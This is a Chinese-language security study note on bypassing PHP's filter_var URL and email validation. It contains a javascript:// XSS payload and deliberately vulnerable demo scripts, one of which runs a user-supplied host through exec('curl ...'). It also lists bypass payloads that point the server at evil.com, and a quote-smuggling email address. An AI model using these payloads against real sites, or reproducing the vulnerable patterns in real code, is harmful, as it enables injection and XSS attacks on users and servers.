## filter_var
filter_var — 使用特定的过滤器过滤一个变量



函数结构：
```
filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed
```
### `FILTER_VALIDATE_URL`
参考：
- https://secure.php.net/manual/zh/function.filter-var.php
- https://www.anquanke.com/post/id/101058

**javascript**  
`filter_var('javascript://comment%250Aalert(1)', FILTER_VALIDATE_URL);`会导致XSS攻击。因为//在JavaScript中表示单行注释，%250a解码后为换行符，所以alert(1)和//不在一行，就可以执行。

demo
```php
<?php
$url = filter_var($_GET['url'],FILTER_VALIDATE_URL);
var_dump($url);
$url=htmlspecialchars($url);
var_dump($url);
echo "<a href='$url'>Next slide </a>";
```


**网址**  
在如下脚本中：
```php
<?php
   $url = $_GET['url'];
   echo "Argument: ".$url."\n";
   if(filter_var($url, FILTER_VALIDATE_URL)) {
      $r = parse_url($url);
      var_dump($r);
      if(preg_match('/skysec\.top$/', $r['host'])) {
         exec('curl -v -s "'.$r['host'].'"', $a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }
?>
```
以前可用payload：
```
?url=0://evil.com:23333;skysec.top:80/
?url=0://evil$skysec.top
```

但是19-7-1日测试会报错如下：
```
Argument: 0://192.168.1.112:82,skysec.top:80/
C:\Users\j7ur8\Desktop\html\index.php:6:
array(4) {
  'scheme' =>
  string(1) "0"
  'host' =>
  string(27) "192.168.1.112:82,skysec.top"
  'port' =>
  int(80)
  'path' =>
  string(1) "/"
}
* Rebuilt URL to: 192.168.1.112:82,skysec.top/
* Port number ended with ','
* Closing connection -1
```

### `FILTER_VALIDATE_EMAIL`
参考：
- https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x03-filter_validate_email
- https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly

绕过方法为：`"Joe'Blow"@example.com`，逃逸了单引号。
```php
<?php
$email = '"Joe\'Blow"@example.com';
if (filter_var($email, FILTER_VALIDATE_EMAIL))
        var_dump(filter_var($email, FILTER_VALIDATE_EMAIL));
else
        echo "email not correct";

//C:\Users\j7ur8\Desktop\test.php:4:string(22) ""Joe'Blow"@example.com"
?>
```
